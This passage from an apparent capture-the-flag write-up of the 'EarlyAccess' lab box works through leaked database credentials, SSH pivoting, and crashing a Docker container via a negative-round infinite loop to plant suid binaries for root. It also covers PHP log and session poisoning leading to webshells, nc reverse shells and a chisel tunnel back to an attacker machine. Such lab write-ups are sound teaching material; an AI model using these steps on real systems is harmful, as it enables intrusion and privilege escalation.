t":"0001-01-01T00:00:00Z","Health":{"FailingStreak":0,"Log":[{"End":"2021-09-05T16:39:23.732527044+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-05T16:39:23.615335831+02:00"},{"End":"2021-09-05T16:39:28.861426975+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-05T16:39:28.737502807+02:00"},{"End":"2021-09-05T16:39:33.964770078+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-05T16:39:33.866497266+02:00"},{"End":"2021-09-05T16:39:39.076153592+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-05T16:39:38.96800925+02:00"},{"End":"2021-09-05T16:39:44.20008397+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-05T16:39:44.080659122+02:00"}],"Status":"healthy"},"OOMKilled":false,"Paused":false,"Pid":1072,"Restarting":false,"Running":true,"StartedAt":"2021-09-05T00:29:55.033551915Z","Status":"running"}},"status":200}
```

There is another database password for the user drew, which turns out to be also his ssh password.

```
$ echo -n '<db_out>' | jq
...
      ],
      "Env": [
        "MYSQL_DATABASE=db",
        "MYSQL_USER=drew",
        "MYSQL_PASSWORD=drew",
        "MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",
        "SERVICE_TAGS=dev",
        "SERVICE_NAME=mysql",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "GOSU_VERSION=1.12",
        "MYSQL_MAJOR=8.0",
        "MYSQL_VERSION=8.0.25-1debian10"
      ],
...
```

Being logged in as drew we are able to grab the user flag.

```
$ ssh drew@earlyaccess.htb
drew@earlyaccess.htb's password:
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Sep  5 16:48:25 2021 from 10.10.14.64
drew@earlyaccess:~$ wc -c user.txt
33 user.txt
drew@earlyaccess:~$
```

# Root

## Docker restart

Looking around on the host there is an email to drew from game-adm. The email states there is a docker running with an active healthcheck. If the health check fails the docker will get restarted.

```
drew@earlyaccess:~$ cat /var/mail/drew
To: <drew@earlyaccess.htb>
Subject: Game-server crash fixes
From: game-adm <game-adm@earlyaccess.htb>
Date: Thu May 27 8:10:34 2021


Hi Drew!

Thanks again for taking the time to test this very early version of our newest project!
We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...)
If the game hangs now, the server will restart and be available again after about a minute.

If you find any other problems, please don't hesitate to report them!

Thank you for your efforts!
Game-adm (and the entire EarlyAccess Studios team).
```

Looking at our ssh keys we seem to have the key pair for this container.

```
drew@earlyaccess:~$ find  .ssh/ -ls
   260803      4 drwxr-x---   2 drew     drew         4096 Sep  5 10:55 .ssh/
   260805      4 -rw-------   1 drew     drew          749 Jul 14 12:25 .ssh/id_rsa.pub
   260804      4 -rw-------   1 drew     drew         3389 Jul 14 12:25 .ssh/id_rsa
   260210      4 -rw-r--r--   1 drew     drew          444 Sep  5 11:17 .ssh/known_hosts
```

```
drew@earlyaccess:~$ cat .ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMYU1DjEX8HWBPFBxoN+JXFBJUZBPr+IFO5yI25HMkFSlQZLaJajtEHeoBsD1ldSi7Q0qHYvVhYh7euYhr85vqa3cwGqJqJH54Dr5WkNDbqrB5AfgOWkUIomV4QkfZSmKSmI2UolEjVf1pIYYsJY+glqzJLF4hQ8x4d2/vJj3CmWDJeA0AGH0+3sjpmpYyoY+a2sW0JAPCDvovO1aT7FOnYKj3Qyl7NDGwJkOoqzZ66EmU3J/1F0e5XNg74wK8dvpZOJMzHola1CS8NqRhUJ7RO2EEZ0ITzmuLmY9s2N4ZgQPlwUvhV5Aj9hqckV8p7IstrpdGsSbZEv4CR2brsEhwsspAJHH+350e3dCYMR4qDyitsLefk2ezaBRAxrXmZaeNeBCZrZmqQ2+Knak6JBhLge9meo2L2mE5IoPcjgH6JBbYOMD/D3pC+MAfxtNX2HhB6MR4Rdo7UoFUTbp6KIpVqtzEB+dV7WeqMwUrrZjs72qoGvO82OvGqJON5F/OhoHDao+zMJWxNhE4Zp4DBii39qhm2wC6xPvCZT0ZSmdCe3pB82Jbq8yccQD0XGtLgUFv1coaQkl/CU5oBymR99AXB/QnqP8aML7ufjPbzzIEGRfJVE2A3k4CQs4Zo+GAEq7WNy1vOJ5rZBucCUXuc2myZjHXDw77nvettGYr5lcS8w== game-tester@game-server
```

Checking the arp table reveals possible locations of the docker and checking it we are able to sucessfully ssh into it.

```
drew@earlyaccess:~$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.101     0x1         0x2         02:42:ac:12:00:65     *        br-715423fd08f2
172.19.0.3       0x1         0x2         02:42:ac:13:00:03     *        br-7e2e34a6a210
172.19.0.4       0x1         0x0         02:42:ac:13:00:04     *        br-7e2e34a6a210
10.129.0.1       0x1         0x2         00:50:56:b9:f8:ec     *        ens160
172.18.0.2       0x1         0x2         02:42:ac:12:00:02     *        br-715423fd08f2
172.18.0.102     0x1         0x2         02:42:ac:12:00:66     *        br-715423fd08f2
```

```
drew@earlyaccess:~$ ssh game-tester@172.19.0.3
Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep  5 09:17:52 2021 from 172.19.0.1
game-tester@game-server:~$
```

```
game-tester@game-server:~$ cat /entrypoint.sh
#!/bin/bash
for ep in /docker-entrypoint.d/*; do
if [ -x "${ep}" ]; then
    echo "Running: ${ep}"
    "${ep}" &
  fi
done
tail -f /dev/null
```

Looking at the entrypoint.sh script it executes all files in the `/docker-entrypoint.d/` directory which seems to be mirrored from the host filesystem. We might be able to abuse this to get root on the docker by placing our script in there. However for this to work the docker needs to be restarted.

Checking for listening ports there is an application listening on port `9999`

```
game-tester@game-server:~$ ss -ln
Netid  State      Recv-Q Send-Q                                                                      Local Address:Port                                                                                     Peer Address:Port
nl     UNCONN     0      0                                                                                       0:0                                                                                                    *
nl     UNCONN     0      0                                                                                       0:587                                                                                                  *
nl     UNCONN     4352   0                                                                                       4:18106                                                                                                *
nl     UNCONN     768    0                                                                                       4:0                                                                                                    *
nl     UNCONN     0      0                                                                                       6:0                                                                                                    *
nl     UNCONN     0      0                                                                                       9:50                                                                                                   *
nl     UNCONN     0      0                                                                                       9:0                                                                                                    *
nl     UNCONN     0      0                                                                                      10:0                                                                                                    *
nl     UNCONN     0      0                                                                                      12:0                                                                                                    *
nl     UNCONN     0      0                                                                                      15:0                                                                                                    *
nl     UNCONN     0      0                                                                                      16:0                                                                                                    *
udp    UNCONN     0      0                                                                              127.0.0.11:47481                                                                                               *:*
tcp    LISTEN     0      128                                                                                     *:22                                                                                                  *:*
tcp    LISTEN     0      128                                                                            127.0.0.11:45337                                                                                               *:*
tcp    LISTEN     0      128                                                                                     *:9999                                                                                                *:*
tcp    LISTEN     0      128                                                                                    :::22                                                                                                 :::*
```

We can find the source for this is `/usr/src/app/server.js`. The server runs a rock paper scissors games and allowes to autoplay for a specified number of round. The script sets the maximum amount of rounds to 100, but only checks if the value ever reaches 0. Specifying a negative value we should be able to generate an infinite loop, hang the container and fail the healthcheck.

`server.js`
```js
'use strict';

var express = require('express');
var ip = require('ip');

const PORT = 9999;
var rounds = 3;

// App
var app = express();
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));

/**
 * https://stackoverflow.com/a/1527820
 *
 * Returns a random integer between min (inclusive) and max (inclusive).
 * The value is no lower than min (or the next integer greater than min
 * if min isn't an integer) and no greater than max (or the next integer
 * lower than max if max isn't an integer).
 * Using Math.round() will give you a non-uniform distribution!
 */
function random(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


/**
 * https://stackoverflow.com/a/11377331
 *
 * Returns result of game (randomly determined)
 *
 */
function play(player = -1)
{
  // Random numbers to determine win
  if (player == -1)
    player = random(1, 3);
  var computer = random(1, 3);

  if (player == computer) return 'tie';
  else if ((player - computer + 3) % 3 == 1) return 'win';
  else return 'loss';
}

app.get('/', (req, res) => {
  res.render('index');
});

app.get('/autoplay', (req,res) => {
  res.render('autoplay');
});

app.get('/rock', (req,res) => {
  res.render('index', {result:play(1)});
});

app.get('/paper', (req,res) => {
  res.render('index', {result:play(2)});
});

app.get('/scissors', (req,res) => {
  res.render('index', {result:play(3)});
});

app.post('/autoplay', async function autoplay(req,res) {

  // Stop execution if not number
  if (isNaN(req.body.rounds))
  {
    res.sendStatus(500);
    return;
  }
  // Stop execution if too many rounds are specified (performance issues may occur otherwise)
  if (req.body.rounds > 100)
  {
    res.sendStatus(500);
    return;
  }

  rounds = req.body.rounds;

  res.write('<html><body>')
  res.write('<h1>Starting autoplay with ' + rounds + ' rounds</h1>');

  var counter = 0;
  var rounds_ = rounds;
  var wins = 0;
  var losses = 0;
  var ties = 0;

  while(rounds != 0)
  {
    counter++;
    var result = play();
    if(req.body.verbose)
    {
      res.write('<p><h3>Playing round: ' + counter + '</h3>\n');
      res.write('Outcome of round: ' + result + '</p>\n');
    }
    if (result == "win")
      wins++;
    else if(result == "loss")
      losses++;
    else
      ties++;

    // Decrease round
    rounds = rounds - 1;
  }
  rounds = rounds_;

  res.write('<h4>Stats:</h4>')
  res.write('<p>Wins: ' + wins + '</p>')
  res.write('<p>Losses: ' + losses + '</p>')
  res.write('<p>Ties: ' + ties + '</p>')
  res.write('<a href="/autoplay">Go back</a></body></html>')
  res.end()
});

app.listen(PORT, "0.0.0.0");
```

For easier access we first set up a reverse portforward of the application to our machine using chisel.

```
$ ./chisel server -p 9000 -reverse
```

```
game-tester@game-server:/tmp$ chmod +x chisel
game-tester@game-server:/tmp$ ./chisel client 10.10.14.64:9000 R:9999:127.0.0.1:9999 &
[1] 18784
game-tester@game-server:/tmp$ 2021/09/05 15:08:25 client: Connecting to ws://10.10.14.64:9000
```

Looking at the application in our webbrowser it is the one the source mentions.

[![rock_paper_scissors](/img/earlyaccess/rock_paper_scissors.png)](/img/earlyaccess/rock_paper_scissors.png)

We go over to the autoplay functionality and intercept the request in burp.

[![autoplay](/img/earlyaccess/autoplay.png)](/img/earlyaccess/autoplay.png)

Next we open up another ssh connection and run an infinete loop on the host putting our script in place. The script simply copies `bash` to `/tmp` and gives it the suid bit.

```
$ ssh drew@earlyaccess.htb
drew@earlyaccess.htb's password:
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Sep  5 16:49:01 2021 from 10.10.14.64
drew@earlyaccess:~$ while true; do printf 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /opt/docker-entrypoint.d/rce.sh; chmod 777 /opt/docker-entrypoint.d/rce.sh;done
```

Now we can send the request with the negative round count to crash the docker.

[![burp_negative](/img/earlyaccess/burp_negative.png)](/img/earlyaccess/burp_negative.png)

After a few moments the health check fails and we get logged out of the docker ssh connection.

```
game-tester@game-server:/tmp$ Connection to 172.19.0.3 closed by remote host.
Connection to 172.19.0.3 closed.
drew@earlyaccess:~$ ssh game-tester@172.19.0.3
```

Logging back in we see the suid `bash` waiting for us in the `/tmp` folder.(The ip of the container might change with the restart)

```
drew@earlyaccess:~$ ssh game-tester@172.19.0.3
Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep  5 14:55:31 2021 from 172.19.0.1
game-tester@game-server:~$ ls -la /tmp/
total 9232
drwxrwxrwt 1 root        root           4096 Sep  5 15:13 .
drwxr-xr-x 1 root        root           4096 Sep  5 00:29 ..
-rwsr-sr-x 1 root        root        1099016 Sep  5 15:13 bash
-rwxr-xr-x 1 game-tester game-tester 8339456 Sep  4 20:42 chisel
drwxr-xr-x 3 root        root           4096 Jul  7 17:26 v8-compile-cache-0
```

Now we can easily escalate to root in the docker.

```
game-tester@game-server:~$ /tmp/bash -p
bash-4.4# id
uid=1001(game-tester) gid=1001(game-tester) euid=0(root) egid=0(root) groups=0(root),1001(game-tester)
```

Since the `/docker-entrypoint.d/` in the container is mapped to `/opt/docker-entrypoint.d/` on the host filesystem we can simply copy `sh` into it and give it the suid bit.

```
bash-4.4# cp /bin/sh /docker-entrypoint.d/
bash-4.4# chmod +s /docker-entrypoint.d/sh
```

This gives us root on the host and we can add the root flag to our collection.

```
drew@earlyaccess:~$ /opt/docker-entrypoint.d/sh
# wc -c /root/root.txt
33 /root/root.txt
```

# Unintended

Until some time after release the box had some unintended ways to solve in the web part which shortened it quite a bit.

## Register admin

You could simply register a user with the name `admin` and then log into game bypassing the XSS and key verification step.

[![register_admin](/img/earlyaccess/register_admin.png)](/img/earlyaccess/register_admin.png)

[![admin_game](/img/earlyaccess/admin_game.png)](/img/earlyaccess/admin_game.png)

## Abuse cookie reuse

There was also a vulnerability in the session cookies of the app in the container. Since both apps ran in the same container they shared the session cookies. With this you could simply replace the dev cookie with the game cookie and get access to dev.

[![game_cookie](/img/earlyaccess/game_cookie.png)](/img/earlyaccess/game_cookie.png)

[![dev_cookie](/img/earlyaccess/dev_cookie.png)](/img/earlyaccess/dev_cookie.png)

## Log poisoning

Once in dev it was possible to include files outside of the webroot with the `file://` wrapper. Since this also includes php code you could get RCE by including files you can write php code to. One of those files are the access logs. The location could be retrieved by first including the `000-default.conf` of apache.

[![burp_sites_available](/img/earlyaccess/burp_sites_available.png)](/img/earlyaccess/burp_sites_available.png)

Checking the mentioned log path you were able to include it.

[![burp_log_available](/img/earlyaccess/burp_log_available.png)](/img/earlyaccess/burp_log_available.png)

Next you had to poison the log with php code. Since the `User-Agent` header is included in the log you could just exchange it for a small php webshell and make a request to the correct site. Generally you have to be cautios though to not have a syntax error because it makes the log unusable for further RCE.

[![burp_poison](/img/earlyaccess/burp_poison.png)](/img/earlyaccess/burp_poison.png)

Including the log again now with our parameter from the webshell we have RCE on the target.

[![poison_rce](/img/earlyaccess/poison_rce.png)](/img/earlyaccess/poison_rce.png)

We set up our listener and upon sending the request we recieve a shell back as www-data on the webserver container.

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

[![poison_reverse_shell](/img/earlyaccess/poison_reverse_shell.png)](/img/earlyaccess/poison_reverse_shell.png)

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.215.71.
Ncat: Connection from 10.129.215.71:43620.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Session poisoning

Another way to get RCE from LFI in php is to poison the session. The session get's usually stored in the format `sess_{your PHPSESSID}`. The place for it can vary though, here it is in `/tmp`. Since we have control over it's content with e.g. the username we can simply change our username and include it. This is more reliable than log poisoning because we are able to correct syntax mistakes.

[![burp_session](/img/earlyaccess/burp_session.png)](/img/earlyaccess/burp_session.png)

Updating the username to contain a small php webshell and refreshing the pages you could achieve RCE in the same way as with log poisoning.

[![update_username](/img/earlyaccess/update_username.png)](/img/earlyaccess/update_username.png)

[![poison_sess_rce](/img/earlyaccess/poison_sess_rce.png)](/img/earlyaccess/poison_sess_rce.png)

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

[![poison_sess_revshell](/img/earlyaccess/poison_sess_revshell.png)](/img/earlyaccess/poison_sess_revshell.png)

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.215.71.
Ncat: Connection from 10.129.215.71:47218.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```